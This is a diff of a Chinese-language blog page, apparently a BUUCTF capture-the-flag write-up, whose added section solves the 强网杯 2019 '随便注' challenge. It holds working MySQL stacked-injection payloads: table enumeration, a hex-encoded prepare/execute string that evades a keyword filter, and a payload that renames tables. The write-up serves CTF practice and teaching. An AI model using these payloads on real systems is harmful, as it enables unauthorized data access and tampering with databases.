@@ -18,8 +18,12 @@
 <meta property="og:image" content="https://liuliuliuzy.github.io/2021/02/26/BUUCTF-web%E8%AE%B0%E5%BD%95/image-20210226210928641.png">
 <meta property="og:image" content="https://liuliuliuzy.github.io/2021/02/26/BUUCTF-web%E8%AE%B0%E5%BD%95/image-20210227161029874.png">
 <meta property="og:image" content="https://liuliuliuzy.github.io/2021/02/26/BUUCTF-web%E8%AE%B0%E5%BD%95/image-20210227161238808.png">
+<meta property="og:image" content="https://liuliuliuzy.github.io/2021/02/26/BUUCTF-web%E8%AE%B0%E5%BD%95/image-20210227195602210.png">
+<meta property="og:image" content="https://liuliuliuzy.github.io/2021/02/26/BUUCTF-web%E8%AE%B0%E5%BD%95/image-20210227202522051.png">
+<meta property="og:image" content="https://liuliuliuzy.github.io/2021/02/26/BUUCTF-web%E8%AE%B0%E5%BD%95/image-20210227202426166.png">
+<meta property="og:image" content="https://liuliuliuzy.github.io/2021/02/26/BUUCTF-web%E8%AE%B0%E5%BD%95/image-20210227202949683.png">
 <meta property="article:published_time" content="2021-02-26T13:16:12.000Z">
-<meta property="article:modified_time" content="2021-02-27T09:00:54.867Z">
+<meta property="article:modified_time" content="2021-02-27T12:54:16.870Z">
 <meta property="article:author" content="zyLeo">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -60,7 +64,8 @@
 <meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="zyLeo's blog-饮下星光" type="application/atom+xml">
 </head>
 
-<body class="max-width mx-auto px3 ltr">    
+<body class="max-width mx-auto px3 ltr">
+    
       <div id="header-post">
   <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
   <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
@@ -114,7 +119,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-HCTF-2018-WarmUp"><span class="toc-number">1.</span> <span class="toc-text">0x00 [HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-number">2.</span> <span class="toc-text">0x01 [极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">0x02 [强网杯 2019]随便注</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-HCTF-2018-WarmUp"><span class="toc-number">1.</span> <span class="toc-text">0x00 [HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-number">2.</span> <span class="toc-text">0x01 [极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">0x02 [强网杯 2019]随便注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF1"><span class="toc-number">3.1.</span> <span class="toc-text">思路1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF2"><span class="toc-number">3.2.</span> <span class="toc-text">思路2</span></a></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -192,7 +197,24 @@
 <p>但是把<code>#</code>换成<code>--</code>就不行，暂时还不知道为什么。</p>
 <p>登录之后拿到flag</p>
 <p><img src="image-20210227161238808.png" alt="image-20210227161238808"></p>
-<h2 id="0x02-强网杯-2019-随便注"><a href="#0x02-强网杯-2019-随便注" class="headerlink" title="0x02 [强网杯 2019]随便注"></a>0x02 [强网杯 2019]随便注</h2>
+<h2 id="0x02-强网杯-2019-随便注"><a href="#0x02-强网杯-2019-随便注" class="headerlink" title="0x02 [强网杯 2019]随便注"></a>0x02 [强网杯 2019]随便注</h2><p>网页提供了一个输入框，点击提交将会发出get请求，参数为inject=[输入的内容]。看源码，注释里提示“sqlmap是没有灵魂的”。</p>
+<p>我的尝试：</p>
+<p>提交<code>admin&#39; or &#39;1&#39;=&#39;1&#39; #</code>，结果页面上显示这些东西。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line"> [0]=&gt;</span><br><span class="line"> string(1) &quot;1&quot;</span><br><span class="line"> [1]=&gt;</span><br><span class="line"> string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line"> [0]=&gt;</span><br><span class="line"> string(1) &quot;2&quot;</span><br><span class="line"> [1]=&gt;</span><br><span class="line"> string(12) &quot;miaomiaomiao&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line"> [0]=&gt;</span><br><span class="line"> string(6) &quot;114514&quot;</span><br><span class="line"> [1]=&gt;</span><br><span class="line"> string(2) &quot;ys&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>显然，这应该是查询语句所作用的表的所有记录，一共有3条。</p>
+<p>为了找到flag，使用堆叠注入，输入<code>1&#39;;show tables;#</code>，查询所有表名。发现存在<code>words</code>和<code>1919810931114514</code>两个表。</p>
+<p><img src="image-20210227195602210.png" alt="image-20210227195602210" style="zoom:67%;" /></p>
+<p>再使用desc查看两个表的结构，输入<code>1&#39;;desc words</code>，<code>1&#39;;desc 1919810931114514;#</code>。这里有个小trick，使用纯数字表名  要在表名前后加上 ``(这里由于markdown无法转义的问题，所以没有加入到行内代码块中，实际输入要在数字前后加上)。可以看到flag内容位于1919810931114514表中。</p>
+<p><img src="image-20210227202522051.png" alt="words表结构" style="zoom:67%;" /></p>
+<p><img src="image-20210227202426166.png" alt="1919810931114514表结构" style="zoom:67%;" /></p>
+<p>接下来要想办法查询到该表中的flag内容。直接堆叠注入查询语句，会发现<code>select</code>等关键字都被过滤掉了。</p>
+<p><img src="image-20210227202949683.png" alt="image-20210227202949683"></p>
+<p>于是有两种思路</p>
+<h3 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h3><p>使用MySql的prepare功能，这是一个类似于计划任务的功能。将select查询语句转换为16进制，然后prepare…from…来执行该语句。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;SeT@a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span><br></pre></td></tr></table></figure>
+<h3 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h3><p>直接修改表的名字，<code>rename</code>/<code>alter</code>等关键字是没有被筛选的，所以可以被输入执行。先将<code>words</code>表名改为其他名字，再将<code>1919810931114514</code>表名改为<code>words</code>，就可以从中查询。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to &#96;123&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;;alter table &#96;words&#96; add id int(10);#</span><br></pre></td></tr></table></figure>
+
   </div>
 </article>
 
@@ -225,7 +247,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-HCTF-2018-WarmUp"><span class="toc-number">1.</span> <span class="toc-text">0x00 [HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-number">2.</span> <span class="toc-text">0x01 [极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">0x02 [强网杯 2019]随便注</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-HCTF-2018-WarmUp"><span class="toc-number">1.</span> <span class="toc-text">0x00 [HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-number">2.</span> <span class="toc-text">0x01 [极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">0x02 [强网杯 2019]随便注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF1"><span class="toc-number">3.1.</span> <span class="toc-text">思路1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF2"><span class="toc-number">3.2.</span> <span class="toc-text">思路2</span></a></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
@@ -360,22 +382,5 @@
     </script>
 
 
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        tex2jax: {
-            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
-            processEscapes: true
-        }
-    });
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax();
-        for (var i = 0; i < all.length; ++i)
-            all[i].SourceElement().parentNode.className += ' has-jax';
-    });
-</script>
-<!-- <script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> -->
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
 </body>
 </html>
